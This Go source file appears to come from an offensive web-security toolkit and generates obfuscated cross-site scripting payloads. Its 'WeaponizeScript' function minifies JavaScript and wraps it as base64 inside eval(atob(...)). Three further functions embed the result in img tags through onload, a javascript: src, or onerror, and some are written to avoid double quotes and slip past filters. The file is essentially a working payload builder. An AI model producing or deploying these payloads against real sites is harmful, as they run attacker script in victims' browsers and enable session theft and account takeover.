package js

import (
	"bytes"
	"encoding/base64"

	"github.com/tdewolff/minify"
	minifyJS "github.com/tdewolff/minify/js"
)

// TinyImage is the smalles possible transparent GIF image, encoded as a
// data-uri (stackoverflow: /questions/9126105/blank-image-encoded-as-data-uri)
var TinyImage = "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="

// WeaponizeScript weaponizes a javascript script by making it minifying
// it, then base64-ing it. The result should be an eval(atob('base64-encoded
// -data')). An error is only returned if the minifier results in an error.
func WeaponizeScript(js string) (string, error) {

	m := minify.New()
	m.AddFunc("text/javascript", minifyJS.Minify)

	r := bytes.NewReader([]byte(js))
	buf := bytes.Buffer{}
	w := base64.NewEncoder(base64.StdEncoding, &buf)
	if err := m.Minify("text/javascript", w, r); err != nil {
		return "", err
	}
	w.Close()

	return "eval(atob('" + buf.String() + "'))", nil
}

// ImageizeScript encodes javascript into an html image. An error is only
// returned if the minifier results in an error.
func ImagizeScript(js string) (string, error) {
	weaponized, err := WeaponizeScript(js)
	return `<img src="` + TinyImage + `" onload="javascript:` + weaponized + `">`, err
}

// EmptyImageizeScript encodes javascript into an html image without the
// use of double quotes
func EmptyImagizeScript(js string) (string, error) {
	weaponized, err := WeaponizeScript(js)
	return `<img src=javascript:` + weaponized + `>`, err
}

// ErrorImagizeScript encodes javascript into an html image without the
// use of double quotes through the onerror= tag when the image cannot
// load the src a.
func ErrorImagizeScript(js string) (string, error) {
	weaponized, err := WeaponizeScript(js)
	return `<img src=a onerror=javascript:` + weaponized + `>`, err
}
